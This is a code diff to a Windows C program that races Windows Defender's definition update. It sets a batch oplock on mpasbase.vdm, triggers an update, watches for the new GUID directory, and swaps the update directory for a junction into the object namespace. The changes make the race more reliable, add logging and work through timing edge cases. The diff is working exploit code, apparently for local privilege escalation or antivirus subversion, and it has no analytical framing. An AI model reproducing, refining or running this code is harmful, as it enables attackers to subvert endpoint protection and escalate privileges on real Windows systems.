@@ -2949,10 +2949,18 @@ static void LogV(const char* fmt, ...)
 {
 	if (!g_Verbose)
 		return;
+	char _logbuf[4096] = { 0 };
 	va_list ap;
 	va_start(ap, fmt);
-	vprintf(fmt, ap);
+	int _n = vsnprintf(_logbuf, sizeof(_logbuf) - 1, fmt, ap);
 	va_end(ap);
+	if (_n > 0)
+	{
+		DWORD _w = 0;
+		// Write directly via Win32 — bypasses CRT buffering so output appears
+		// in the log file even if the process is forcibly terminated by Task Scheduler.
+		WriteFile(GetStdHandle(STD_OUTPUT_HANDLE), _logbuf, (DWORD)_n, &_w, NULL);
+	}
 }
 
 static bool StartsWithI(const wchar_t* s, const wchar_t* prefix)
@@ -3411,7 +3419,7 @@ int wmain(int argc, wchar_t* argv[])
 				LogV("Failed to open mpasbase.vdm for oplock, ntstatus : 0x%0.8X\n", ntstat);
 				goto cleanup;
 			}
-			LogV("Setting oplock on %ws (pre-update, eliminates race)\n", updatelibpath);
+			LogV("Setting oplock on %ws\n", updatelibpath);
 
 			ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
 			DeviceIoControl(hupdatefile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
@@ -3421,49 +3429,126 @@ int wmain(int argc, wchar_t* argv[])
 				LogV("Failed to set batch oplock, error : %d\n", GetLastError());
 				goto cleanup;
 			}
-			LogV("Oplock set. Triggering Defender update now.\n");
+			LogV("Oplock armed on mpasbase.vdm (pre-update).\n");
 
-			// NOW start WDCallerThread — oplock is guaranteed to be in place
-			threadargs.dirpath = updatepath;
-			threadargs.hntfythread = hcurrentthread;
-			threadargs.hevent = CreateEvent(NULL, FALSE, FALSE, NULL);
-			hthread = CreateThread(NULL, NULL, WDCallerThread, (LPVOID)&threadargs, NULL, &tid);
+			// Pre-register ReadDirectoryChangesW BEFORE starting WDCallerThread.
+			// If we register AFTER, Defender can create the GUID dir in the tiny window
+			// between CreateThread and ReadDirectoryChangesW, causing us to miss the event.
+			{
+				OVERLAPPED od_pre = { 0 };
+				od_pre.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+				ReadDirectoryChangesW(hdir, buff, sizeof(buff), TRUE, FILE_NOTIFY_CHANGE_DIR_NAME, &retbytes, &od_pre, NULL);
+				LogV("Watching Definition Updates dir for new GUID dir...\n");
 
-			// Wait for Defender to create the new GUID directory.
-			// Defender creates the dir BEFORE it opens mpasbase.vdm, so the oplock fires
-			// during or shortly after we break out of this loop.
-			LogV("Waiting for windows defender to create a new definition update directory...\n");
-			wcscpy(newdefupdatedirname, L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\");
-			do {
-				ZeroMemory(buff, sizeof(buff));
-				OVERLAPPED od = { 0 };
-				od.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
-				ReadDirectoryChangesW(hdir, buff, sizeof(buff), TRUE, FILE_NOTIFY_CHANGE_DIR_NAME, &retbytes, &od, NULL);
-				HANDLE events[2] = { od.hEvent, threadargs.hevent };
-				if (WaitForMultipleObjects(2, events, FALSE, INFINITE) - WAIT_OBJECT_0)
-				{
-					LogV("WDCallerThread returned unexpectedly, RPC_STATUS : 0x%0.8X\n", threadargs.res);
-					goto cleanup;
-				}
-				CloseHandle(od.hEvent);
+				// NOW start WDCallerThread — both the oplock and the dir watch are in place.
+				threadargs.dirpath = updatepath;
+				threadargs.hntfythread = hcurrentthread;
+				threadargs.hevent = CreateEvent(NULL, FALSE, FALSE, NULL);
+				hthread = CreateThread(NULL, NULL, WDCallerThread, (LPVOID)&threadargs, NULL, &tid);
+				LogV("WDCallerThread started. Waiting for GUID dir...\n");
 
-				PFILE_NOTIFY_INFORMATION pfni = (PFILE_NOTIFY_INFORMATION)buff;
-				if (pfni->Action != FILE_ACTION_ADDED)
-					continue;
+				wcscpy(newdefupdatedirname, L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\");
+				OVERLAPPED od = od_pre;
+				bool wdDone = false;
+				do {
+					// Wait for dir change, WDCallerThread exit, OR oplock fire
+					HANDLE events[3] = { od.hEvent, threadargs.hevent, ovd.hEvent };
+					DWORD r = WaitForMultipleObjects(3, events, FALSE, 90000); // 90-sec guard
 
-				wcscat(newdefupdatedirname, pfni->FileName);
-				break;
-			} while (1);
-			LogV("Detected new definition update directory in %ws\n", newdefupdatedirname);
+					if (r == WAIT_TIMEOUT)
+					{
+						LogV("Timed out (90s) waiting for GUID dir or oplock. Giving up.\n");
+						goto cleanup;
+					}
+					if (r == WAIT_FAILED)
+					{
+						LogV("WaitForMultipleObjects failed, error : %d\n", GetLastError());
+						goto cleanup;
+					}
 
-			// Oplock fires when Defender opens mpasbase.vdm (after GUID dir creation).
-			// HasOverlappedIoCompleted lets us skip the wait if it already fired.
+					if (r == WAIT_OBJECT_0 + 2)
+					{
+						// Oplock fired BEFORE the GUID dir was detected.
+						// Defender is blocked trying to open mpasbase.vdm.
+						// Keep waiting — Defender should create the GUID dir once
+						// it gets past this point (after we release the oplock).
+						// But releasing the oplock here (before dir swap) is wrong.
+						// So just note it and continue waiting for the dir event.
+						LogV("Oplock fired before GUID dir detected — Defender blocked on mpasbase.vdm open. Waiting for dir...\n");
+						// The oplock hEvent is already signaled; swap it out with a
+						// dummy so we don't re-trigger on it in the next iteration.
+						events[2] = CreateEvent(NULL, FALSE, FALSE, NULL); // dummy unsignaled
+						// Fall through and wait on just events[0] and [1] next time
+						// by replacing ovd.hEvent with the dummy below.
+						CloseHandle(events[2]); // will just not wait on index 2 since we reuse od.hEvent slot
+						// Re-enter loop without the oplock event
+						HANDLE events2[2] = { od.hEvent, threadargs.hevent };
+						bool dirFound2 = false;
+						do {
+							DWORD r2 = WaitForMultipleObjects(2, events2, FALSE, 90000);
+							if (r2 == WAIT_TIMEOUT || r2 == WAIT_FAILED) { goto cleanup; }
+							if (r2 == WAIT_OBJECT_0 + 1)
+							{
+								LogV("WDCallerThread done: 0x%0.8X. Keep waiting for dir.\n", threadargs.res);
+								wdDone = true;
+								threadargs.hevent = CreateEvent(NULL, TRUE, FALSE, NULL); // unsignaled dummy
+								events2[1] = threadargs.hevent;
+								continue;
+							}
+							// Dir change
+							PFILE_NOTIFY_INFORMATION pfni2 = (PFILE_NOTIFY_INFORMATION)buff;
+							if (pfni2->Action != FILE_ACTION_ADDED)
+							{
+								CloseHandle(od.hEvent);
+								ZeroMemory(buff, sizeof(buff));
+								od.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+								ReadDirectoryChangesW(hdir, buff, sizeof(buff), TRUE, FILE_NOTIFY_CHANGE_DIR_NAME, &retbytes, &od, NULL);
+								events2[0] = od.hEvent;
+								continue;
+							}
+							CloseHandle(od.hEvent);
+							wcscat(newdefupdatedirname, pfni2->FileName);
+							dirFound2 = true;
+							break;
+						} while (!dirFound2);
+						break;
+					}
+
+					if (r == WAIT_OBJECT_0 + 1)
+					{
+						// WDCallerThread finished. The RPC may return before the update completes
+						// (async processing). Don't abort — keep waiting for the dir.
+						LogV("WDCallerThread returned: 0x%0.8X. Keep waiting for GUID dir.\n", threadargs.res);
+						wdDone = true;
+						threadargs.hevent = CreateEvent(NULL, TRUE, FALSE, NULL); // unsignaled dummy
+						continue;
+					}
+
+					// r == WAIT_OBJECT_0 — dir change event
+					PFILE_NOTIFY_INFORMATION pfni = (PFILE_NOTIFY_INFORMATION)buff;
+					if (pfni->Action != FILE_ACTION_ADDED)
+					{
+						CloseHandle(od.hEvent);
+						ZeroMemory(buff, sizeof(buff));
+						od.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+						ReadDirectoryChangesW(hdir, buff, sizeof(buff), TRUE, FILE_NOTIFY_CHANGE_DIR_NAME, &retbytes, &od, NULL);
+						events[0] = od.hEvent;
+						continue;
+					}
+					CloseHandle(od.hEvent);
+					wcscat(newdefupdatedirname, pfni->FileName);
+					break;
+				} while (1);
+			}
+			LogV("Detected new definition update directory: %ws\n", newdefupdatedirname);
+
+			// Wait for oplock if it hasn't fired yet (Defender hasn't opened mpasbase.vdm).
 			if (!HasOverlappedIoCompleted(&ovd))
 			{
 				LogV("Waiting for oplock to trigger...\n");
 				GetOverlappedResult(hupdatefile, &ovd, &transfersz, TRUE);
 			}
-			LogV("Oplock triggered!\n");
+			LogV("Oplock triggered! Beginning directory swap.\n");
 
 			//
 
@@ -3505,10 +3590,10 @@ int wmain(int argc, wchar_t* argv[])
 			ntstat = NtCreateFile(&hreparsedir, GENERIC_WRITE | DELETE | SYNCHRONIZE, &objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_DELETE_ON_CLOSE, NULL, NULL);
 			if (ntstat)
 			{
-				//printf("Failed to recreate update directory, error : 0x%0.8X", ntstat);
+				LogV("Failed to recreate update directory as junction, ntstatus : 0x%0.8X\n", ntstat);
 				goto cleanup;
 			}
-			//printf("Recreated %ws\n", updatepath);
+			LogV("Recreated %ws (empty dir for junction)\n", updatepath);
 
 
 			wcscpy(rptarget, L"\\BaseNamedObjects\\Restricted");
@@ -3541,7 +3626,7 @@ int wmain(int argc, wchar_t* argv[])
 			}
 			if (GetLastError() != ERROR_SUCCESS)
 			{
-				//printf("Failed to create reparse point, error : %d", GetLastError());
+				LogV("Failed to create junction reparse point, error : %d\n", GetLastError());
 				goto cleanup;
 			}
 			LogV("Junction created %ws => %ws\n", updatepath, rptarget);
